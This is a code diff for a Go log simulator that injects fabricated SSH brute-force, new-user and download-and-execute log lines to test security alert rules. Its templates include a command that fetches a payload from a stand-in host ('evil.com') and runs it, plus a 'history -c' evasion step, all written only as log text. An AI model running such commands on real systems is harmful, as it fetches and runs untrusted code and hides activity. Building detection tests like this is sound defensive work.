@@ -39,32 +39,29 @@ var suspiciousScenarios = []Scenario{
 func main() {
 	log.Println("Starting log simulator....")
 
-	testcase := flag.String("testcase", "", "Run a specific, targeted test case: 'download', 'bruteforce', 'newuser'")
+	scenario := flag.String("scenario", "", "Run a specific, targeted test case: 'download', 'bruteforce', 'newuser', or 'rapid'")
+	continuous := flag.Bool("continuous", false, "Run a continuous simulation of random, single log events.")
 
 	flag.Parse()
 
-	if *testcase != "" {
-		runScenario(*testcase)
-	} else {
+	if *scenario != "" {
+		runScenario(*scenario)
+	} else if *continuous {
 		runContinousSimulation()
-	}
-}
-
-func appendLog(message string) {
-	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Fatalf("failed to open log file: %v", err)
-	}
-
-	defer f.Close()
-
-	if _, err := f.WriteString(message); err != nil {
-		log.Printf("failed to write to log file: %v", err)
+	} else {
+		log.Println("No mode specified. Use '--scenario=<name>' for a targeted test or '--continuous for a random simulation.")
 	}
 }
 
 func runScenario(name string) {
 	log.Printf("Starting targeted log simulation for '%s'...", name)
+
+	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatalf("failed to open og file: %v", err)
+	}
+	defer f.Close()
+
 	switch name {
 	case "bruteforce":
 		log.Println("Starting targeted log simulation for 'Brute-Force & Evasion'...")
@@ -75,17 +72,17 @@ func runScenario(name string) {
 			timestamp := time.Now().Format("Jan  2 15:04:05")
 			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
 			failedLog := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
-			appendLog(failedLog)
+			f.WriteString(failedLog)
 			time.Sleep(200 * time.Millisecond) // Short delay between attempts
 		}
-
+		log.Println("--> A 'TooManyFailedLogins' alert should have fired.")
 		time.Sleep(3 * time.Second)
 
 		log.Println("Injecting: Successful Login post-brute-force")
 		timestampSuccess := time.Now().Format("Jan  2 15:04:05")
 		sshdPID, portSuccess := rand.Intn(9000)+1000, rand.Intn(60000)+1024
 		successLog := fmt.Sprintf(acceptedLoginTemplate, timestampSuccess, sshdPID, "root", attackIP, portSuccess)
-		appendLog(successLog)
+		f.WriteString(successLog)
 
 		time.Sleep(5 * time.Second)
 
@@ -96,9 +93,9 @@ func runScenario(name string) {
 		ppidEvasion := sshdPID
 
 		evasionLog := fmt.Sprintf(execsnoopTemplate, timestampEvasion, 0, "bash", pidEvasion, ppidEvasion, 0, "history -c")
-		appendLog(evasionLog)
+		f.WriteString(evasionLog)
 
-		log.Println("Simulation finished.")
+		log.Println("--> A 'CorrelatedBruteForceAndEvasion' alert should have fired.")
 	case "download":
 		log.Println("Starting targeted log simulation for 'Download & Execute'...")
 
@@ -109,7 +106,7 @@ func runScenario(name string) {
 		timestamp1 := time.Now().UTC().Format(execsnoopTimeFormat)
 		pid1, ppid1 := rand.Intn(9000)+1000, rand.Intn(9000)+1000
 		downloadLog := fmt.Sprintf(execsnoopTemplate, timestamp1, 1000, "wget", pid1, ppid1, 0, "wget -O /tmp/payload.sh http://evil.com/payload.sh")
-		appendLog(downloadLog)
+		f.WriteString(downloadLog)
 
 		// 2. Wait for 5 seconds
 		time.Sleep(5 * time.Second)
@@ -119,7 +116,7 @@ func runScenario(name string) {
 		timestamp2 := time.Now().Format("15:04:05")
 		pid2, ppid2 := rand.Intn(9000)+1000, rand.Intn(9000)+1000
 		executeLog := fmt.Sprintf(execsnoopTemplate, timestamp2, 1000, "bash", pid2, ppid2, 0, "bash /tmp/payload.sh")
-		appendLog(executeLog)
+		f.WriteString(executeLog)
 
 		log.Println("Simulation finished.")
 	case "newuser":
@@ -135,7 +132,7 @@ func runScenario(name string) {
 		timestampCreate := time.Now().UTC().Format(execsnoopTimeFormat)
 		pidCreate, ppidCreate := rand.Intn(9000)+1000, rand.Intn(9000)+1000
 		createLog := fmt.Sprintf(execsnoopTemplate, timestampCreate, 0, "useradd", pidCreate, ppidCreate, 0, "useradd "+newUser)
-		appendLog(createLog)
+		f.WriteString(createLog)
 
 		// 2. Wait for 5 seconds
 		time.Sleep(5 * time.Second)
@@ -145,7 +142,7 @@ func runScenario(name string) {
 		timestampLogin := time.Now().Format(sshdTimeFormat)
 		pidLogin, portLogin := rand.Intn(9000)+1000, rand.Intn(60000)+1024
 		loginLog := fmt.Sprintf(acceptedLoginTemplate, timestampLogin, pidLogin, newUser, loginIP, portLogin)
-		appendLog(loginLog)
+		f.WriteString(loginLog)
 	default:
 		log.Fatalf("Unknown test case: %s", name)
 	}
